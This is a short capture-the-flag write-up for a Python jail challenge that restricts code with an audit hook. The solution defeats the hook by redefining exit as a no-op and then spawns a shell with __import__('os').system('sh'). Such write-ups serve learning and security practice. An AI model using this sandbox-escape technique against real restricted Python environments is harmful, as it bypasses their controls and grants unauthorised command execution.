# tax evasion

made by puzzler7

source is [here](https://imaginaryctf.org/ArchivedChallenges/18)

## challenge

```py
import sys

def audit(name, args):
    if name not in ["exec", "compile", "builtins.input", "builtins.input/result"]:
        print("you did a bad thing")
        print(name, args)
        print("stay in jail forever")
        exit(0)

sys.addaudithook(audit)

while True:
    try:
        code = input(">>> ")
        exec(code)
    except Exception as e:
        print("Error occurred")
        exit(0)
```

## solution

overwrite `exit` with `lambda a: None` by doing `exit = lambda a: None`

then just use `__import__('os').system('sh')` to get a shell
